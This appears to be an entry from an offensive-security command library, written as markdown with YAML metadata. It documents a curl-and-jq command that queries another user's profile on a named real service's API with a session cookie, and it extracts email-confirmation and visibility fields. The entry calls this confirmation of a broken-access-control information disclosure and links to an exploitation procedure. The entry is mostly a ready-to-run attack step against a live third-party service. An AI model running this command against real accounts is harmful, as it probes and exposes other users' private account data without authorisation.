---
data: >-
  curl -s -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host:
  wakatime.com" -b cookies.txt | jq '{is_email_confirmed: .is_email_confirmed,
  is_email_public: .is_email_public, public_email: .public_email}'
tags:
  - api
  - analysis
  - jq
type: command
output: Filtered JSON showing sensitive fields
executor: bash
platforms:
  - Web
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.059Z'
id: 22a56e35-73d2-4539-9c92-c14d94cd7885
verified: false
validated: true
submitted: true
---
# analyze-api-response

## Command

```bash
curl -s -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt | jq '{is_email_confirmed: .is_email_confirmed, is_email_public: .is_email_public, public_email: .public_email}'
```

## Description

This command fetches and parses the API response to extract key sensitive fields, confirming the information disclosure from the broken access control.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode for curl | Yes |
| `-X GET` | HTTP GET method | Yes |
| `https://wakatime.com/api/v1/users/target_username` | Target endpoint | Yes |
| `-H "Host: wakatime.com"` | Host header | Yes |
| `-b cookies.txt` | Session cookie | Yes |
| `jq '{...}'` | Filters JSON fields | Yes |

## Examples

### Basic Usage

```bash
curl -s -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt | jq '{is_email_confirmed: .is_email_confirmed, is_email_public: .is_email_public, public_email: .public_email}'
```

### Advanced Usage

```bash
curl -s -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt > response.json && jq . response.json
```

## Expected Output

{"is_email_confirmed": true, "is_email_public": false, "public_email": null}

## Related

- [[commands/curl-request-arbitrary-profile]]
- [[procedures/Exploit-WakaTime-API-Broken-Access-Control]]
